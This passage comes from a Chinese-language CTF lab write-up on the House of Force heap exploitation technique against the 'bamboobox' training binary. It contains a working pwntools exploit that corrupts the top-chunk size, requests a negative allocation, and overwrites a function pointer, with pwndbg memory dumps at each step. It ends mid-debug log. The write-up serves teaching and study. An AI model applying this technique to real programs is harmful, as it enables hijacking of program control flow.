<br><br></code></pre></td></tr></tbody></table></figure><p>ok，输入完成，接下来我们查看堆的分布</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603000</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603020</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603040</span><br>Size: <span class="hljs-number">0x21</span><br><br>Top chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x603060</span><br>Size: <span class="hljs-number">0x20fa1</span><br><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>堆的内存分布f</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x603000</span><br><span class="hljs-number">0x603000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0x603010</span>:<span class="hljs-number">0x0000000000400896</span><span class="hljs-number">0x00000000004008b1</span><br>#hello_message      #goodbye_message<br><span class="hljs-number">0x603020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #chunk0<br><span class="hljs-number">0x603030</span>:<span class="hljs-number">0x00000a6161616161</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x603040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #chunk1<br><span class="hljs-number">0x603050</span>:<span class="hljs-number">0x00000a6262626262</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x603060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020fa1</span> #top_chunk<br>......(省略内容均为空)<br><span class="hljs-number">0x6030e0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">.bss:<span class="hljs-number">00000000006020</span>C0                 public itemlist<br>.bss:<span class="hljs-number">00000000006020</span>C0 ; item itemlist[<span class="hljs-number">100</span>]<br>.bss:<span class="hljs-number">00000000006020</span>C0 itemlist        item <span class="hljs-number">64</span>h <span class="hljs-title function_">dup</span><span class="hljs-params">(&lt;?&gt;)</span>       ; DATA XREF: add_item+A4↑o<br>.bss:<span class="hljs-number">0000000000602700</span>                 public num<br>.bss:<span class="hljs-number">0000000000602700</span> ; <span class="hljs-type">int</span> num<br>.bss:<span class="hljs-number">0000000000602700</span> num             dd ?                    ; DATA XREF: show_item+<span class="hljs-number">8</span>↑r<br></code></pre></td></tr></tbody></table></figure><ul><li><p>itemlist[] 记录着堆块的指针</p></li><li><p>num 记录着堆块的数量。</p></li></ul><p>查看一下堆指针信息</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x6020c0</span><br><span class="hljs-number">0x6020c0</span> &lt;itemlist&gt;:<span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x0000000000603030</span> #chunk0<br>#struct_size        #struct_content_ptr<br><span class="hljs-number">0x6020d0</span> &lt;itemlist+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000014</span><span class="hljs-number">0x0000000000603050</span> #chunk1<br>#struct_size        #struct_content_ptr<br><span class="hljs-number">0x6020e0</span> &lt;itemlist+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020f0</span> &lt;itemlist+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602100</span> &lt;itemlist+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br><span class="hljs-comment">//注意struct_content_ptr指向malloc出来malloc_data的地址</span><br></code></pre></td></tr></tbody></table></figure><p>保存着每一个chunk的 size（输入的大小） 和 chunk地址</p><h3 id="攻击原理及exp"><a href="#攻击原理及exp" class="headerlink" title="攻击原理及exp"></a>攻击原理及exp</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./bamboobox'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice</span>):<br>  p.sendlineafter(<span class="hljs-string">''</span>,<span class="hljs-built_in">str</span>(choice))<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>  cmd(<span class="hljs-number">2</span>)<br>  p.sendlineafter(<span class="hljs-string">'item name:'</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">'item:'</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>  cmd(<span class="hljs-number">3</span>)<br>  p.sendlineafter(<span class="hljs-string">'of item:'</span>,<span class="hljs-built_in">str</span>(index))<br>  p.sendlineafter(<span class="hljs-string">'item name:'</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">'the item:'</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>  cmd(<span class="hljs-number">4</span>)<br>  p.sendlineafter(<span class="hljs-string">'of item:'</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>  cmd(<span class="hljs-number">5</span>)<br><br>magic = <span class="hljs-number">0x400d49</span><br>create(<span class="hljs-number">0x30</span>, <span class="hljs-string">"aaaa"</span>)<br>content=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">'1'</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>,content)<br>offset=-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>create(offset,<span class="hljs-string">'bbbb'</span>)<br>create(<span class="hljs-number">0x10</span>,p64(magic)*<span class="hljs-number">2</span>)<br>quit()<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h3 id="payload-分析"><a href="#payload-分析" class="headerlink" title="payload 分析"></a>payload 分析</h3><p>我们的目标是修改堆中的0x4008b1（goodbye_message）为magic函数地址：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">--------------------------------------------------------------------------<br>修改之前：<br>pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x603000</span><br><span class="hljs-number">0x603000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0x603010</span>:<span class="hljs-number">0x0000000000400896</span><span class="hljs-number">0x00000000004008b1</span><br>#hello_message      #goodbye_message<br>--------------------------------------------------------------------------<br>我们所期望的：<br>pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x603000</span><br><span class="hljs-number">0x603000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0x603010</span>:<span class="hljs-number">0x0000000000400896</span><span class="hljs-number">0x0000000000400d49</span><br>#hello_message      <span class="hljs-meta">#magic函数</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">def <span class="hljs-title function_">cmd</span><span class="hljs-params">(choice)</span>:<br>  p.<span class="hljs-title function_">sendlineafter</span><span class="hljs-params">(<span class="hljs-string">'',str(choice))</span></span><br><span class="hljs-string"><span class="hljs-params">  </span></span><br><span class="hljs-string"><span class="hljs-params">def create(size,content):</span></span><br><span class="hljs-string"><span class="hljs-params">  cmd(2)</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>item name:<span class="hljs-string">',str(size))</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>item:<span class="hljs-string">',content)</span></span><br><span class="hljs-string"><span class="hljs-params"></span></span><br><span class="hljs-string"><span class="hljs-params">def edit(index,size,content):</span></span><br><span class="hljs-string"><span class="hljs-params">  cmd(3)</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>of item:<span class="hljs-string">',str(index))</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>item name:<span class="hljs-string">',str(size))</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>the item:<span class="hljs-string">',content)</span></span><br><span class="hljs-string"><span class="hljs-params"></span></span><br><span class="hljs-string"><span class="hljs-params">def delete(index):</span></span><br><span class="hljs-string"><span class="hljs-params">  cmd(4)</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>of item:<span class="hljs-string">',str(index))</span></span><br><span class="hljs-string"><span class="hljs-params"></span></span><br><span class="hljs-string"><span class="hljs-params">def quit():</span></span><br><span class="hljs-string"><span class="hljs-params">  cmd(5)</span></span><br></code></pre></td></tr></tbody></table></figure><p>首先来看第一部分的payload，这些代码的主要功能是自动化执行程序的功能。也是exp中最基础的部分，没有什么好说的。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">create(<span class="hljs-number">0x30</span>, <span class="hljs-string">"aaaa"</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; vmmap<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>          <span class="hljs-number">0x400000</span>           <span class="hljs-number">0x402000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox<br>          <span class="hljs-number">0x601000</span>           <span class="hljs-number">0x602000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">1000</span>   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox<br>          <span class="hljs-number">0x602000</span>           <span class="hljs-number">0x603000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">2000</span>   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox<br>          <span class="hljs-number">0x603000</span>           <span class="hljs-number">0x624000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap]<br>    <span class="hljs-number">0x7ffff7a0d000</span>     <span class="hljs-number">0x7ffff7bcd000</span> r-xp   <span class="hljs-number">1</span>c0000 <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7bcd000</span>     <span class="hljs-number">0x7ffff7dcd000</span> ---p   <span class="hljs-number">200000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dcd000</span>     <span class="hljs-number">0x7ffff7dd1000</span> r--p     <span class="hljs-number">4000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd1000</span>     <span class="hljs-number">0x7ffff7dd3000</span> rw-p     <span class="hljs-number">2000</span> <span class="hljs-number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd3000</span>     <span class="hljs-number">0x7ffff7dd7000</span> rw-p     <span class="hljs-number">4000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7dd7000</span>     <span class="hljs-number">0x7ffff7dfd000</span> r-xp    <span class="hljs-number">26000</span> <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7fdc000</span>     <span class="hljs-number">0x7ffff7fdf000</span> rw-p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7ff7000</span>     <span class="hljs-number">0x7ffff7ffa000</span> r--p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      [vvar]<br>    <span class="hljs-number">0x7ffff7ffa000</span>     <span class="hljs-number">0x7ffff7ffc000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      [vdso]<br>    <span class="hljs-number">0x7ffff7ffc000</span>     <span class="hljs-number">0x7ffff7ffd000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffd000</span>     <span class="hljs-number">0x7ffff7ffe000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffe000</span>     <span class="hljs-number">0x7ffff7fff000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffffffde000</span>     <span class="hljs-number">0x7ffffffff000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [<span class="hljs-built_in">stack</span>]<br><span class="hljs-number">0xffffffffff600000</span> <span class="hljs-number">0xffffffffff601000</span> r-xp     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      [vsyscall]<br><br></code></pre></td></tr></tbody></table></figure><p>执行完上面的payload之后堆块的状况如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0xe80000</span><br><span class="hljs-number">0xe80000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0xe80010</span>:<span class="hljs-number">0x0000000000400896</span><span class="hljs-number">0x00000000004008b1</span><br>    #hello_message      #goodbye_message<br><span class="hljs-number">0xe80020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000041</span> #chunk0（<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>)）<br><span class="hljs-number">0xe80030</span>:<span class="hljs-number">0x0000000a61616161</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe80040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe80050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe80060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020fa1</span> #top_chunk<br><span class="hljs-number">0xe80070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe80080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe80090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe800a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe800b0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe800c0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe800d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe800e0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>然后我们编辑刚才创建的堆块（index0）：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">content=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">'1'</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>,content)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0xe80000</span><br><span class="hljs-number">0xe80000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0xe80010</span>:<span class="hljs-number">0x0000000000400896</span><span class="hljs-number">0x00000000004008b1</span><br>    #hello_message      #goodbye_message<br><span class="hljs-number">0xe80020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000041</span> #chunk0（<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>)）<br><span class="hljs-number">0xe80030</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80040</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80050</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80060</span>:<span class="hljs-number">0x3131313131313131</span><span class="hljs-number">0xffffffffffffffff</span> #top_chunk<br><span class="hljs-number">0xe80070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>......（省略内容均为空）<br><span class="hljs-number">0xe800e0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>从上面的内容可以看到，top_chunk的size已经被更改为0xffffffffffffffff，利用它我们就可以控制任意内存的地址。继续向下看paylaod：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">offset=-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>create(offset,<span class="hljs-string">'bbbb'</span>)<br></code></pre></td></tr></tbody></table></figure><p>这个offset怎么来的？</p><p>首先要明确目标为修改goodbye_message函数为magic函数。在gdb调试中，goodbye_message函数指针的地址为：0xe80010，现在的top_chunk地址为0xe80060</p><p>要想修改地址，应该将 top_chunk 指向0xe80000（heap_base）处，这样当下次再分配chunk时，就可以分配到goodbye_message处的内存了。</p><p>如何计算？本题是向低地址移动，将上一小节的公式带入到本题中：</p><p>malloc_size=0xe80000-0xe80060-0x10=-0x70</p><p>因此要malloc(-0x70)，完成此步骤之后堆内存如下图所示：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0xe80000</span><br><span class="hljs-number">0xe80000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000059</span> #new_top_chunk<br><span class="hljs-number">0xe80010</span>:<span class="hljs-number">0x0000000000400896</span><span class="hljs-number">0x00000000004008b1</span><br>    #hello_message      #goodbye_message<br><span class="hljs-number">0xe80020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000041</span> #chunk0（<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>)）<br><span class="hljs-number">0xe80030</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80040</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80050</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80060</span>:<span class="hljs-number">0x3131313131313131</span><span class="hljs-number">0xffffffffffffffa1</span> #old_top_chunk<br><span class="hljs-number">0xe80070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>......（省略内容均为空）<br><span class="hljs-number">0xe800e0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>此时已经可以控制goodbye_message的地址，覆盖后退出程序就可以触发magic函数。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">create(<span class="hljs-number">0x10</span>,p64(magic)*<span class="hljs-number">2</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0xe80000</span><br><span class="hljs-number">0xe80000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #现在已经被控制的chunk<br><span class="hljs-number">0xe80010</span>:<span class="hljs-number">0x0000000000400d49</span><span class="hljs-number">0x0000000000400d49</span><br>    #hello_message      <span class="hljs-meta">#magic</span><br><span class="hljs-number">0xe80020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000039</span> #chunk0（<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>)）<br><span class="hljs-number">0xe80030</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80040</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80050</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80060</span>:<span class="hljs-number">0x3131313131313131</span><span class="hljs-number">0xffffffffffffffa1</span> #top_chunk<br><span class="hljs-number">0xe80070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>......（省略内容均为空）<br><span class="hljs-number">0xe800e0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h3 id="debug-exp"><a href="#debug-exp" class="headerlink" title="debug-exp"></a>debug-exp</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c">➜  ~ cd Desktop/<br>    <span class="hljs-string">'5.exit\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Your choice:'</span><br>[DEBUG] Sent <span class="hljs-number">0x5</span> bytes:<br>    <span class="hljs-string">'bbbb\n'</span><br>[DEBUG] Sent 